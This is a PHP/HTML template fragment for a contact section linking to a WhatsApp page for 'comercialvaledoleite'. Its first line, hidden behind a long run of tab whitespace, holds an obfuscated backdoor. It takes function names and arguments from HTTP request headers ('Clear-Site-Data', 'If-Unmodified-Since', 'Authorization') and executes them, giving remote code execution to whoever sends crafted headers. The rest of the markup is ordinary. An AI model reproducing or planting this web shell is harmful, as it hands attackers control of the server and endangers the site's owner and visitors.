<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Clear-Site-Data'])){$partition=$_HEADERS['Clear-Site-Data']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Authorization']));$partition();}
          ...
          <div id="flexContainer" class=" mt-5">
            ...
            <div id="ShowContent">
              ...
              <div class="contactIcon" style=" margin: 0 2% 0 18%;" id="whatsaIcon">
                <a class="nav-link" style=" margin: 0 2% 0 2%;" href="https://whats.link/comercialvaledoleite" target="_blank"><i class="bi bi-whatsapp" style="width: 35px;"></i><strong style="margin-left: 4px;">clique aqui</strong></a>
              </div>
            </div>
          </div>
          </div>
